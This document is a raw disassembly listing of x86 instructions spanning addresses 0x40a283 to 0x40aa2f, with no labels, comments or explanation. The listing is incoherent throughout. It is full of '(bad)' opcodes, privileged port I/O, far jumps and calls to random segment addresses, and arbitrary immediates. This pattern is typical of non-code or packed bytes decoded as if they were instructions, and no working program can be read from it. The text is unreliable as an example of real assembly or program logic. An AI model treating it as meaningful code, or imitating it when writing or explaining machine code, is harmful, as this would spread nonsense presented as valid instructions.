  40a283:	add    eax,0xbc064704
  40a288:	add    al,0xbf
  40a28a:	dec    sp
  40a28c:	jge    0x40a300
  40a28e:	bound  ecx,QWORD PTR [esi+ebp*1+0x73]
  40a292:	or     BYTE PTR [edx+0x130e9b66],cl
  40a298:	dec    ebx
  40a299:	stos   BYTE PTR es:[edi],al
  40a29a:	pop    esp
  40a29b:	daa    
  40a29c:	mov    DWORD PTR [ecx+0x5c82f98e],ebx
  40a2a2:	std    
  40a2a3:	xor    eax,0x7ad7c449
  40a2a8:	loopne 0x40a293
  40a2aa:	mov    bl,0x46
  40a2ac:	enter  0x367c,0x32
  40a2b0:	(bad)
  40a2b4:	pushf  
  40a2b5:	jmp    0x40a310
  40a2b7:	mov    bl,0xd3
  40a2b9:	push   0x23c62acf
  40a2be:	push   0xffffffb5
  40a2c0:	sub    eax,eax
  40a2c2:	jmp    0x3912ade1
  40a2c7:	and    BYTE PTR [edi+edi*1-0x2e],al
  40a2cb:	je     0x40a27c
  40a2cd:	cmp    edx,DWORD PTR [ecx+ebp*1-0x6450882f]
  40a2d4:	hlt    
  40a2d5:	fist   DWORD PTR [esi-0xf985907]
  40a2db:	mov    dh,0x94
  40a2dd:	test   eax,0x7568d680
  40a2e2:	jmp    0x83ab:0x5cea63da
  40a2e9:	jle    0x40a2b7
  40a2eb:	ret    0x7a2d
  40a2ee:	mov    edi,0x2bd32844
  40a2f3:	add    eax,0xed7c429f
  40a2f8:	push   0xf45efecc
  40a2fd:	vpsrad ymm0,ymm2,XMMWORD PTR [edx-0x6b]
  40a302:	shl    edx,cl
  40a304:	dec    edx
  40a305:	sub    ah,BYTE PTR [ecx]
  40a307:	enter  0xb030,0xa3
  40a30b:	(bad)  
  40a30c:	fbstp  TBYTE PTR [edx]
  40a30e:	pop    ss
  40a30f:	lea    esi,[edx+0x79]
  40a312:	mov    ah,ch
  40a314:	scas   eax,DWORD PTR es:[edi]
  40a315:	inc    ecx
  40a316:	mov    esp,0xfc60fe72
  40a31b:	(bad)  
  40a31c:	lahf   
  40a31d:	sahf   
  40a31e:	mov    esp,0xa187f614
  40a323:	sub    al,0x0
  40a325:	ins    DWORD PTR es:[edi],dx
  40a326:	inc    ebp
  40a327:	cs push esi
  40a329:	pushf  
  40a32a:	scas   al,BYTE PTR es:[edi]
  40a32b:	sub    DWORD PTR [edx+0x7eee395f],esp
  40a331:	dec    edx
  40a332:	lds    ecx,FWORD PTR [eax-0x317cf7be]
  40a338:	lods   al,BYTE PTR ds:[esi]
  40a339:	push   ebp
  40a33a:	pushf  
  40a33b:	dec    ebp
  40a33c:	jge    0x40a3b3
  40a33e:	(bad)  
  40a33f:	or     cl,BYTE PTR [ecx-0x2c]
  40a342:	mov    ebx,0xfe139672
  40a347:	les    esi,FWORD PTR [esi+eiz*8-0x53]
  40a34b:	cmp    eax,0x1410d924
  40a350:	push   cs
  40a351:	stos   DWORD PTR es:[edi],eax
  40a352:	shr    DWORD PTR [edx],1
  40a354:	xchg   ebx,eax
  40a355:	fistp  DWORD PTR [ebx]
  40a357:	fadd   QWORD PTR [ecx+0x5952b66b]
  40a35d:	fild   WORD PTR [esp+ebx*8]
  40a360:	xchg   ebx,edi
  40a362:	test   eax,0x3abc43ce
  40a367:	push   ebx
  40a368:	xor    ebx,DWORD PTR [edx-0x77]
  40a36b:	add    ebp,DWORD PTR [edx]
  40a36d:	fwait
  40a36e:	(bad)  
  40a36f:	aas    
  40a370:	in     al,dx
  40a371:	fldenv ds:0x22ba1a64
  40a377:	dec    ebx
  40a378:	data16 jp 0x40a3b7
  40a37b:	in     eax,dx
  40a37c:	inc    ecx
  40a37d:	pop    esp
  40a37e:	push   edx
  40a37f:	add    eax,0xf0e01c9d
  40a384:	push   ss
  40a385:	fucom  st(5)
  40a387:	mov    BYTE PTR [eax+0xb],bl
  40a38a:	jmp    0x7366:0xf8d6ea63
  40a391:	je     0x40a330
  40a393:	sub    eax,0xfabb17fb
  40a398:	mov    eax,edx
  40a39a:	add    DWORD PTR [edx+0x1e],eax
  40a39d:	push   0xff7638ac
  40a3a2:	xchg   dl,bh
  40a3a4:	leave  
  40a3a5:	mov    cl,0xd9
  40a3a7:	xlat   BYTE PTR gs:[ebx]
  40a3a9:	ret    0xceaa
  40a3ac:	mov    gs,WORD PTR [edx+0x77e7242f]
  40a3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3b3:	mov    esp,0x573383e7
  40a3b8:	add    ecx,DWORD PTR [edx]
  40a3ba:	aad    0xd9
  40a3bc:	inc    esp
  40a3bd:	xlat   BYTE PTR ds:[ebx]
  40a3be:	pushf  
  40a3bf:	adc    dh,ah
  40a3c1:	daa    
  40a3c2:	pop    esi
  40a3c3:	in     al,0x14
  40a3c5:	xor    al,0x95
  40a3c7:	test   BYTE PTR [edi+0xd],al
  40a3ca:	jl     0x40a427
  40a3cc:	mov    ebx,0x36e48afa
  40a3d1:	(bad)  
  40a3d2:	cld    
  40a3d3:	in     al,dx
  40a3d4:	cmp    DWORD PTR [edi+esi*2+0x71],ebx
  40a3d8:	ins    DWORD PTR es:[edi],dx
  40a3d9:	dec    ebp
  40a3da:	ins    BYTE PTR es:[edi],dx
  40a3db:	sub    BYTE PTR [ebx+ecx*4],al
  40a3de:	sbb    DWORD PTR [eax+ebx*1-0x43],eax
  40a3e2:	out    dx,eax
  40a3e3:	int    0x89
  40a3e5:	add    al,BYTE PTR [ebx-0x7c0b3cbb]
  40a3eb:	cmp    eax,0x1a534256
  40a3f0:	pop    esp
  40a3f1:	push   eax
  40a3f2:	cmc    
  40a3f3:	mov    DWORD PTR [edx+0x9a46d57],esi
  40a3f9:	iret   
  40a3fa:	loop   0x40a448
  40a3fc:	mov    al,ds:0x56572ccb
  40a401:	les    ecx,FWORD PTR [edi+ecx*1+0x4d]
  40a405:	pushf  
  40a406:	std    
  40a407:	ja     0x40a480
  40a409:	scas   eax,DWORD PTR es:[edi]
  40a40a:	je     0x40a3d2
  40a40c:	in     eax,0x51
  40a40e:	pop    esi
  40a40f:	into   
  40a410:	mov    ch,0x88
  40a412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a413:	mov    ch,0x24
  40a415:	repz fcmove st,st(4)
  40a418:	xchg   esi,eax
  40a419:	or     esi,DWORD PTR [ebx-0x53b13997]
  40a41f:	cdq    
  40a420:	(bad)  
  40a421:	int3   
  40a422:	popf   
  40a423:	jns    0x40a433
  40a425:	jge    0x40a3c0
  40a427:	test   DWORD PTR [ecx],ebx
  40a429:	pop    esi
  40a42a:	lock push 0x2e
  40a42d:	sbb    dl,BYTE PTR [ebp-0x45db4d88]
  40a433:	cmp    ecx,ecx
  40a435:	inc    esp
  40a436:	jmp    0x60a8:0x44bd8868
  40a43d:	sahf   
  40a43e:	retf   0x8ed8
  40a441:	enter  0xfaec,0xf
  40a445:	aaa    
  40a446:	int    0xca
  40a448:	and    al,dl
  40a44a:	push   es
  40a44b:	sbb    ebp,ebx
  40a44d:	gs mov edi,0x1f129010
  40a453:	enter  0x58ec,0x45
  40a457:	cmp    al,0xd
  40a459:	xchg   DWORD PTR [esi+0x543063ac],edx
  40a45f:	sub    al,0x9e
  40a461:	aaa    
  40a462:	cmp    DWORD PTR [ecx],eax
  40a464:	sbb    bl,bh
  40a466:	stos   BYTE PTR es:[edi],al
  40a467:	ins    BYTE PTR es:[edi],dx
  40a468:	int3   
  40a469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a46a:	or     esi,DWORD PTR [ebx]
  40a46c:	stos   BYTE PTR es:[edi],al
  40a46d:	pop    edx
  40a46e:	xor    BYTE PTR ss:[ebx-0x5ec25124],ch
  40a475:	jae    0x40a4c0
  40a477:	and    BYTE PTR [esi-0x36d326da],ah
  40a47d:	popa   
  40a47e:	rcr    DWORD PTR [eax-0x4d],cl
  40a481:	xchg   esi,eax
  40a482:	popf   
  40a483:	add    al,0x5
  40a485:	fwait
  40a486:	imul   ebp,DWORD PTR [esi-0x3e21249d],0x3d74d9f6
  40a490:	push   esp
  40a491:	dec    eax
  40a492:	mov    ecx,0xa66192da
  40a497:	sub    eax,0x6840ea98
  40a49c:	xlat   BYTE PTR ds:[ebx]
  40a49d:	in     al,0x8a
  40a49f:	aad    0xcf
  40a4a1:	and    BYTE PTR [ecx-0x6a84aa92],0x27
  40a4a8:	test   al,0xd0
  40a4aa:	fidiv  WORD PTR [esi]
  40a4ac:	cmc    
  40a4ad:	or     BYTE PTR [eax],bl
  40a4af:	pop    ds
  40a4b0:	push   ebp
  40a4b1:	jg     0x40a4ca
  40a4b3:	jnp    0x40a4cf
  40a4b5:	fistp  WORD PTR [eax]
  40a4b7:	test   BYTE PTR [eax],0x92
  40a4ba:	adc    eax,0x6c046265
  40a4bf:	sub    eax,0x9270f9e6
  40a4c4:	adc    ecx,DWORD PTR [ebp+0x7394d9be]
  40a4ca:	fprem1 
  40a4cc:	add    ch,bh
  40a4ce:	xor    ebx,DWORD PTR [edi]
  40a4d0:	std    
  40a4d1:	aad    0x8d
  40a4d3:	or     dl,BYTE PTR [esi+0x10]
  40a4d6:	cs jns 0x40a52f
  40a4d9:	cwde   
  40a4da:	test   al,0x4
  40a4dc:	push   0xffffffc6
  40a4de:	jle    0x40a55e
  40a4e0:	ret    0x93e6
  40a4e3:	mov    WORD PTR [edx+0x41],es
  40a4e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4e7:	and    esi,DWORD PTR [edx]
  40a4e9:	popa   
  40a4ea:	add    eax,0xadb77ee6
  40a4ef:	or     ecx,esp
  40a4f1:	cmp    edi,edx
  40a4f3:	cmp    eax,0x4605d5ea
  40a4f8:	jno    0x40a492
  40a4fa:	(bad)  
  40a4fb:	(bad)  
  40a4fc:	out    dx,al
  40a4fd:	inc    ebx
  40a4fe:	pop    ecx
  40a4ff:	call   0x746f:0x6185b3be
  40a506:	jns    0x40a520
  40a508:	jp     0x40a4f2
  40a50a:	sahf   
  40a50b:	sub    BYTE PTR ds:0xf4d96c01,cl
  40a511:	cld    
  40a512:	and    eax,0x69657998
  40a517:	fisub  WORD PTR [ebx]
  40a519:	jge    0x40a544
  40a51b:	imul   ecx,DWORD PTR [edx],0xffffffc7
  40a51e:	jg     0x40a539
  40a520:	test   al,0xfc
  40a522:	jbe    0x40a54e
  40a524:	or     eax,0x36599da4
  40a529:	inc    edi
  40a52a:	outs   dx,DWORD PTR ds:[esi]
  40a52b:	retf   0x1e31
  40a52e:	test   DWORD PTR [edx-0x48],eax
  40a531:	gs gs push cs
  40a534:	hlt    
  40a535:	into   
  40a536:	inc    ecx
  40a537:	and    eax,0x466dd822
  40a53c:	icebp  
  40a53d:	outs   dx,BYTE PTR ds:[esi]
  40a53e:	inc    ebx
  40a53f:	push   ss
  40a540:	paddusb mm6,QWORD PTR [edx]
  40a543:	and    al,bh
  40a545:	xor    ebp,DWORD PTR [ecx+eiz*2+0x17]
  40a549:	inc    esi
  40a54a:	sbb    eax,0x27a7a80b
  40a54f:	push   0x697a1011
  40a554:	div    DWORD PTR [ebx+0x42e5582f]
  40a55a:	adc    eax,0xe2e791c0
  40a55f:	jmp    0x987fe964
  40a564:	aam    0xa9
  40a566:	xchg   edi,eax
  40a567:	out    0xcd,al
  40a569:	xor    bl,bh
  40a56b:	xor    DWORD PTR ds:[eax],ecx
  40a56e:	das    
  40a56f:	sbb    eax,0xb8577c4
  40a574:	or     al,0x85
  40a576:	or     esi,ebp
  40a578:	add    BYTE PTR [esi+edi*8-0x77],0x5c
  40a57d:	cmp    eax,DWORD PTR [edi-0x56359147]
  40a583:	cmp    BYTE PTR [eax+eax*1+0x5d4fb72b],bl
  40a58a:	aaa    
  40a58b:	mov    ds:0x9a7c436b,eax
  40a590:	lea    ebx,[edi+0x65072b38]
  40a596:	jl     0x40a5cb
  40a598:	outs   dx,DWORD PTR ds:[esi]
  40a599:	stos   BYTE PTR es:[edi],al
  40a59a:	imul   edi,DWORD PTR [ebx],0xffffffa0
  40a59d:	dec    edx
  40a59e:	fldcw  WORD PTR [edi+0x7a]
  40a5a1:	jb     0x40a61f
  40a5a3:	in     al,dx
  40a5a4:	lods   eax,DWORD PTR ds:[esi]
  40a5a5:	ror    BYTE PTR [esi],0x6f
  40a5a8:	gs inc ecx
  40a5aa:	xchg   edi,eax
  40a5ab:	dec    eax
  40a5ac:	mov    dh,ah
  40a5ae:	aaa    
  40a5af:	jle    0x40a629
  40a5b1:	push   ebp
  40a5b2:	mov    edx,0x9aeccfab
  40a5b7:	or     dl,BYTE PTR [esi-0x282a3bb1]
  40a5bd:	rol    BYTE PTR [ebx+0x26cf5918],cl
  40a5c3:	stos   BYTE PTR es:[edi],al
  40a5c4:	and    BYTE PTR [edi+0x72ea4709],dl
  40a5ca:	rol    BYTE PTR [ebx-0x31d00fde],cl
  40a5d0:	push   0x325be27c
  40a5d5:	cmp    edx,esp
  40a5d7:	sahf   
  40a5d8:	repz push 0xffffff9a
  40a5db:	jle    0x40a638
  40a5dd:	dec    edi
  40a5de:	shr    BYTE PTR [edx],0xb0
  40a5e1:	loopne 0x40a5c9
  40a5e3:	imul   ecx,DWORD PTR [ebp+0x350e18bf],0xae879e1
  40a5ed:	jmp    0x40a605
  40a5ef:	ret    0xe401
  40a5f2:	or     ecx,DWORD PTR [edi+0x5cebc8f2]
  40a5f8:	mov    ds:0xf416d33,eax
  40a5fd:	loopne 0x40a5f5
  40a5ff:	xchg   ebp,eax
  40a600:	jge    0x40a5bc
  40a602:	test   esi,0x46e49513
  40a608:	dec    ebx
  40a609:	dec    ecx
  40a60a:	cmp    DWORD PTR [edi+0xe3a6d4e],0xffffff91
  40a611:	xlat   BYTE PTR ds:[ebx]
  40a612:	repz out 0x15,al
  40a615:	sbb    esp,DWORD PTR [eax]
  40a617:	sar    DWORD PTR [edi+0x6],0x5a
  40a61b:	(bad)  
  40a61c:	call   0x2fbb0816
  40a621:	cmp    BYTE PTR [esi],al
  40a623:	xor    cl,BYTE PTR es:[edx-0x36]
  40a627:	xchg   ebx,eax
  40a628:	icebp  
  40a629:	(bad)  
  40a62a:	sbb    dh,BYTE PTR [edi]
  40a62c:	adc    eax,0xa8e57e3f
  40a631:	cmp    ch,BYTE PTR [esi]
  40a633:	push   0xb608916c
  40a638:	leave  
  40a639:	mov    esp,0x8b66c0c6
  40a63e:	shr    bh,0xf5
  40a641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a642:	pop    eax
  40a643:	jne    0x40a5de
  40a645:	lods   al,BYTE PTR ds:[esi]
  40a646:	out    dx,al
  40a647:	(bad)  
  40a648:	ss jnp 0x40a672
  40a64b:	jne    0x40a64a
  40a64d:	mov    cl,0x83
  40a64f:	or     esi,DWORD PTR [edi-0x527757f8]
  40a655:	pop    ebx
  40a656:	stos   BYTE PTR es:[edi],al
  40a657:	jns    0x40a636
  40a659:	jmp    0xeb2d:0xc6d44569
  40a660:	dec    eax
  40a661:	test   BYTE PTR [esi],ch
  40a663:	(bad)  
  40a664:	cld    
  40a665:	sub    bl,BYTE PTR [ecx+0x64]
  40a668:	jg     0x40a64e
  40a66a:	out    0xf9,al
  40a66c:	ins    BYTE PTR es:[edi],dx
  40a66d:	out    0x4,eax
  40a66f:	add    esi,esp
  40a671:	cwde   
  40a672:	addr16 mov ch,0x57
  40a675:	jecxz  0x40a65a
  40a677:	mov    al,BYTE PTR [edx]
  40a679:	test   al,0xd3
  40a67b:	idiv   DWORD PTR [edi]
  40a67d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a67e:	retf   0x506b
  40a681:	lock test DWORD PTR [eax+0xf6d463d],ebx
  40a688:	scas   al,BYTE PTR es:[edi]
  40a689:	out    dx,al
  40a68a:	test   eax,0xa1de4555
  40a68f:	and    al,0xe4
  40a691:	cdq    
  40a692:	and    eax,0xe1e37306
  40a698:	sbb    dl,BYTE PTR [ecx]
  40a69a:	mov    bl,0xff
  40a69c:	adc    al,0x9e
  40a69e:	scas   al,BYTE PTR es:[edi]
  40a69f:	call   0x570c:0x83ff7096
  40a6a6:	jecxz  0x40a685
  40a6a8:	or     dl,BYTE PTR [edi-0x65f6e9b9]
  40a6ae:	imul   edi,esi,0x2
  40a6b1:	pop    es
  40a6b2:	sub    cl,BYTE PTR [ebx]
  40a6b4:	add    DWORD PTR [ebp+0x21],eax
  40a6b7:	lds    esp,FWORD PTR [ecx+0x14]
  40a6ba:	add    BYTE PTR [ecx],dh
  40a6bc:	push   edx
  40a6bd:	jecxz  0x40a701
  40a6bf:	cmp    DWORD PTR [ebp-0x41],edx
  40a6c2:	xor    al,BYTE PTR [edi-0x5e7a3379]
  40a6c8:	lods   eax,DWORD PTR ds:[esi]
  40a6c9:	jmp    0xf2b6c0b2
  40a6ce:	clc    
  40a6cf:	mov    al,0xdf
  40a6d2:	mov    ebx,0xcb6a5857
  40a6d7:	adc    al,0xd1
  40a6d9:	xchg   ebp,eax
  40a6da:	ret    0x50b
  40a6dd:	cdq    
  40a6de:	rol    DWORD PTR [ecx+eiz*1-0x3a28bbf5],1
  40a6e5:	jno    0x40a698
  40a6e7:	cmp    esi,DWORD PTR [edx+0x6d]
  40a6ea:	and    al,0xed
  40a6ec:	rol    bl,cl
  40a6ee:	sbb    BYTE PTR [edx-0x5a],ch
  40a6f1:	repnz dec ebp
  40a6f3:	jb     0x40a682
  40a6f5:	(bad)  
  40a6f6:	cmp    al,bl
  40a6f8:	push   cs
  40a6f9:	pop    esp
  40a6fa:	jmp    0x40a75b
  40a6fc:	or     al,0x7f
  40a6fe:	dec    ebx
  40a6ff:	ins    DWORD PTR es:[edi],dx
  40a700:	stos   BYTE PTR es:[edi],al
  40a701:	(bad)  
  40a702:	cmc    
  40a703:	jno    0x40a745
  40a705:	dec    ebp
  40a706:	loope  0x40a72c
  40a708:	or     DWORD PTR cs:[ebp+0xb75456e],0xdae74fcc
  40a713:	mov    ch,0x3b
  40a715:	jb     0x40a776
  40a717:	inc    ecx
  40a718:	xchg   edi,eax
  40a719:	repnz les ebx,FWORD PTR [edi]
  40a71c:	and    cl,BYTE PTR [eax+0x2aa673ee]
  40a722:	jge    0x40a6b2
  40a724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a725:	jo     0x40a6c4
  40a727:	add    DWORD PTR [ecx-0x3d91c3b5],0x8b5e8315
  40a731:	xor    al,0xc8
  40a733:	inc    ebx
  40a734:	jl     0x40a6c4
  40a736:	sbb    ch,ch
  40a738:	(bad)  
  40a739:	jmp    0x40a751
  40a73b:	jmp    ebp
  40a73d:	(bad)
  40a740:	cmc    
  40a741:	mov    eax,DWORD PTR [ecx-0x8]
  40a744:	mov    al,BYTE PTR [edi-0xbfc7eab]
  40a74a:	push   eax
  40a74b:	adc    al,0x5a
  40a74d:	jg     0x40a700
  40a74f:	inc    esi
  40a750:	adc    edi,0x45
  40a753:	sbb    DWORD PTR ds:0x46c262ad,0xffffff8b
  40a75a:	ror    DWORD PTR [ebp+0x71fed86a],0x23
  40a761:	lahf   
  40a762:	(bad)  
  40a763:	fdivr  st(5),st
  40a765:	int    0xad
  40a767:	inc    eax
  40a768:	out    0xce,al
  40a76a:	shl    bh,1
  40a76c:	or     DWORD PTR [ebp+0x7f35d1ad],edi
  40a772:	dec    esp
  40a773:	jge    0x40a7df
  40a775:	scas   eax,DWORD PTR es:[edi]
  40a776:	lds    ecx,FWORD PTR [edx-0x10]
  40a779:	and    eax,0x5d194c95
  40a77e:	mov    esp,0xfe0494b3
  40a783:	inc    esp
  40a784:	mov    DWORD PTR [ebp-0x5a],eax
  40a787:	lea    edi,[esi-0x3e]
  40a78a:	sbb    edi,DWORD PTR [edi+ebp*4]
  40a78d:	jns    0x40a7a4
  40a78f:	(bad)  
  40a790:	jge    0x40a777
  40a792:	xchg   BYTE PTR [ecx-0x3e],ah
  40a795:	iret   
  40a796:	add    al,0x51
  40a798:	jge    0x40a7d9
  40a79a:	jmp    0xd612995b
  40a79f:	add    ah,BYTE PTR [ebx-0x4183b114]
  40a7a5:	add    bl,BYTE PTR [eax+0x68f2d01a]
  40a7ab:	jge    0x40a753
  40a7ad:	sbb    DWORD PTR [ebx+edx*1+0x5808b03f],esp
  40a7b4:	imul   eax,DWORD PTR [ecx-0x40],0xe
  40a7b8:	and    al,0x42
  40a7ba:	add    ebp,ebp
  40a7bc:	fwait
  40a7bd:	popf   
  40a7be:	gs retf 
  40a7c0:	lea    eax,[ecx-0x14403032]
  40a7c6:	push   ecx
  40a7c7:	sbb    DWORD PTR [ebp-0x64850a7f],edx
  40a7cd:	push   esi
  40a7ce:	out    0x1c,al
  40a7d0:	pop    ebx
  40a7d1:	mov    ah,0x72
  40a7d3:	add    eax,0xc359f9c3
  40a7d8:	adc    DWORD PTR [ecx-0x2a7ce06],0x50563d2a
  40a7e2:	aam    0x5c
  40a7e4:	cmp    DWORD PTR [ecx+edx*2+0x3a99b839],0x7b6adab9
  40a7ef:	xchg   edx,eax
  40a7f0:	push   0xefe06058
  40a7f5:	add    eax,0xf1272e31
  40a7fa:	inc    edx
  40a7fb:	enter  0x73,0x4
  40a7ff:	lods   eax,DWORD PTR ds:[esi]
  40a800:	adc    eax,0xce6b4fd1
  40a805:	xor    eax,0x21253d03
  40a80a:	push   0x3e5f7903
  40a80f:	aam    0x20
  40a811:	test   DWORD PTR [edi*1+0x16966b86],esp
  40a818:	repz inc edi
  40a81a:	fcomp  DWORD PTR [ebx+ebx*4+0x49f23976]
  40a821:	xchg   esi,eax
  40a822:	cmp    al,0x76
  40a824:	nop
  40a825:	cmp    esp,ebp
  40a827:	cmp    DWORD PTR [ebp-0x653ba688],0x26d08f68
  40a831:	xchg   edi,eax
  40a832:	std    
  40a833:	in     eax,dx
  40a834:	sahf   
  40a835:	lods   al,BYTE PTR ds:[esi]
  40a836:	inc    edx
  40a837:	ja     0x40a823
  40a839:	sub    eax,0x1a3ae89
  40a83e:	int3   
  40a83f:	jb     0x40a86a
  40a841:	(bad)  
  40a842:	sub    al,0xc8
  40a844:	pop    eax
  40a845:	js     0x40a803
  40a847:	in     eax,dx
  40a848:	adc    eax,0xe953ed3
  40a84d:	fadd   DWORD PTR [eax-0x572e4ccb]
  40a853:	out    dx,al
  40a854:	dec    edi
  40a855:	xchg   DWORD PTR [edx],ebp
  40a857:	sti    
  40a858:	retf   0x34c6
  40a85b:	jl     0x40a820
  40a85d:	lea    ebp,ds:0x2f87e3fb
  40a863:	fstp   DWORD PTR [ecx+0x2be859ad]
  40a869:	je     0x40a80a
  40a86b:	cli    
  40a86c:	data16 test al,0x14
  40a86f:	push   es
  40a870:	popf   
  40a871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a872:	and    ah,bl
  40a874:	fild   QWORD PTR [edx+0x51f273cb]
  40a87a:	rcr    DWORD PTR [esi-0x75],1
  40a87d:	ret    0x27f2
  40a880:	enter  0x238a,0x88
  40a884:	idiv   BYTE PTR [edx]
  40a886:	mov    eax,ds:0x62e00d03
  40a88b:	or     al,0x43
  40a88d:	fidivr WORD PTR [edi+ecx*2]
  40a890:	push   ecx
  40a891:	imul   edi,DWORD PTR [esi+edx*1+0x5e],0x14
  40a896:	js     0x40a8b5
  40a898:	and    al,0xa5
  40a89a:	add    DWORD PTR [edx],edx
  40a89c:	outs   dx,DWORD PTR ds:[esi]
  40a89d:	mov    dh,0xfd
  40a89f:	mov    ah,BYTE PTR [esi]
  40a8a1:	retf   
  40a8a2:	fxch   st(5)
  40a8a4:	iret   
  40a8a5:	xchg   esp,eax
  40a8a6:	xor    dh,BYTE PTR [ebx-0x13b303e3]
  40a8ac:	jbe    0x40a8bb
  40a8ae:	adc    DWORD PTR [ecx],0x3d1e6e3
  40a8b4:	pop    ds
  40a8b5:	mov    cl,BYTE PTR [edx]
  40a8b7:	fbstp  TBYTE PTR [esi+0xc9f8caf]
  40a8bd:	and    eax,0x57a3cf04
  40a8c2:	push   0x67855573
  40a8c7:	inc    esi
  40a8c8:	and    eax,0x5d5188d8
  40a8cd:	pop    esi
  40a8ce:	daa    
  40a8cf:	mul    DWORD PTR [edi+0x6]
  40a8d2:	xchg   BYTE PTR [eax],dh
  40a8d4:	out    dx,al
  40a8d5:	imul   edx,ecx,0x54019a2b
  40a8db:	push   0xffffffa3
  40a8dd:	jmp    0x8349:0x1d4c11c8
  40a8e4:	pusha  
  40a8e5:	popf   
  40a8e6:	mov    ah,dl
  40a8e8:	xchg   esi,eax
  40a8e9:	push   ss
  40a8ea:	les    eax,FWORD PTR [eax+edx*2]
  40a8ed:	push   esp
  40a8ee:	mov    ds:0x1e0e670c,al
  40a8f3:	and    eax,0x7adbb70c
  40a8f8:	dec    ebx
  40a8f9:	ins    DWORD PTR es:[edi],dx
  40a8fa:	clc    
  40a8fb:	enter  0xbb21,0x84
  40a8ff:	loopne 0x40a939
  40a901:	xor    BYTE PTR [ebp+0x44],0x82
  40a905:	jnp    0x40a90f
  40a907:	out    0x5b,al
  40a909:	(bad)  [eax+ebx*8+0x4798c80a]
  40a910:	cmc    
  40a911:	mov    al,ds:0x5a575cb2
  40a916:	stc    
  40a917:	push   0x80a53a1b
  40a91c:	dec    edx
  40a91d:	lods   al,BYTE PTR ds:[esi]
  40a91e:	loope  0x40a97e
  40a920:	lods   eax,DWORD PTR ds:[esi]
  40a921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a922:	or     eax,0xd43affd1
  40a927:	ins    BYTE PTR es:[edi],dx
  40a928:	mov    ds:0xe1608ded,al
  40a92d:	stos   DWORD PTR es:[edi],eax
  40a92e:	jge    0x40a8df
  40a930:	dec    edi
  40a931:	mov    esp,0x296b3240
  40a936:	and    BYTE PTR [edx-0x60],ch
  40a939:	dec    edx
  40a93a:	repnz sub bh,BYTE PTR [eax]
  40a93d:	daa    
  40a93e:	sbb    cl,BYTE PTR [eax]
  40a940:	mov    ebp,0xaa10c4b9
  40a945:	and    eax,DWORD PTR [ecx-0x437440a1]
  40a94b:	jae    0x40a9c8
  40a94d:	mul    ecx
  40a94f:	sbb    eax,0x28474b7a
  40a954:	fwait
  40a955:	ja     0x40a90f
  40a957:	retf   
  40a958:	scas   al,BYTE PTR es:[edi]
  40a959:	sbb    BYTE PTR [ebp-0x23],bh
  40a95c:	(bad)  
  40a95d:	lahf   
  40a95e:	and    al,0x3a
  40a960:	add    eax,DWORD PTR [ebx+ebp*8]
  40a963:	or     DWORD PTR [edi-0x2c7003b2],ebx
  40a969:	sbb    bh,BYTE PTR [esi-0x9]
  40a96c:	les    edi,FWORD PTR [ebx+0x5f]
  40a96f:	jne    0x40a926
  40a971:	call   0x70724dda
  40a976:	stos   BYTE PTR es:[edi],al
  40a977:	sbb    ah,0xa7
  40a97a:	dec    esp
  40a97b:	inc    esp
  40a97c:	jb     0x40a9aa
  40a97e:	cld    
  40a97f:	sbb    DWORD PTR [ecx-0x57],ecx
  40a982:	rcr    BYTE PTR [ecx+eiz*1-0x7ccdbb65],0x8
  40a98a:	and    esp,DWORD PTR [ebp+0xf]
  40a98d:	das    
  40a98e:	icebp  
  40a98f:	jl     0x40a9d1
  40a991:	push   es
  40a992:	pop    ebx
  40a993:	mov    ah,0x30
  40a995:	sub    BYTE PTR [ebx+0x1a],dl
  40a998:	jnp    0x40a933
  40a99a:	push   0xa
  40a99c:	dec    esp
  40a99d:	fdivr  DWORD PTR [edx-0x23]
  40a9a0:	pop    edx
  40a9a1:	scas   al,BYTE PTR es:[edi]
  40a9a2:	cdq    
  40a9a3:	cdq    
  40a9a4:	adc    DWORD PTR [edi+ebp*1],esp
  40a9a7:	dec    eax
  40a9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a9:	mul    DWORD PTR [edx+0x56]
  40a9ac:	sbb    eax,0x81f68f0e
  40a9b1:	mov    esp,0x8afc3a51
  40a9b6:	mov    ds:0x44dc9fa4,al
  40a9bb:	ss inc edi
  40a9bd:	sahf   
  40a9be:	je     0x40a9ba
  40a9c0:	cli    
  40a9c1:	sub    ebp,edx
  40a9c3:	xchg   DWORD PTR [ebx+0x12059b43],edi
  40a9c9:	jb     0x40a993
  40a9cb:	pavgb  mm5,QWORD PTR [ebx-0x5fefe7f]
  40a9d2:	ror    DWORD PTR [edx+0x75],0xaf
  40a9d6:	(bad)  
  40a9d8:	sahf   
  40a9d9:	lahf   
  40a9da:	push   ebp
  40a9db:	cmp    ebp,DWORD PTR [esp+ebp*4-0x65]
  40a9df:	test   eax,0x44c16a32
  40a9e4:	ins    BYTE PTR es:[edi],dx
  40a9e5:	outs   dx,BYTE PTR ds:[esi]
  40a9e6:	aad    0xf
  40a9e8:	xchg   esi,eax
  40a9e9:	inc    esi
  40a9ea:	xor    DWORD PTR [edi+0x78581e14],ebp
  40a9f0:	jns    0x40a9c1
  40a9f2:	or     dh,BYTE PTR [edi+0x14]
  40a9f5:	das    
  40a9f6:	rcr    BYTE PTR [edx+eiz*1+0xa453942],1
  40a9fd:	fsubr  QWORD PTR [ebx+0x1]
  40aa00:	cmp    eax,esi
  40aa02:	pusha  
  40aa03:	ds in  al,dx
  40aa05:	sbb    BYTE PTR [ecx+edx*4-0x5f],0xb2
  40aa0a:	ror    BYTE PTR [ebp-0x36],1
  40aa0d:	mov    esp,0x81017b5e
  40aa12:	add    BYTE PTR [ebx+0x5c447fd7],0xc3
  40aa19:	adc    al,0x9
  40aa1b:	enter  0xa324,0xf3
  40aa1f:	mov    esi,0x8bfd4195
  40aa24:	mov    BYTE PTR [ecx],cl
  40aa26:	mov    al,0xd7
  40aa28:	scas   al,BYTE PTR es:[edi]
  40aa29:	mov    DWORD PTR [edi+0xf4dda15],esi
  40aa2f:	call   FWORD PTR [edi-0x6a]
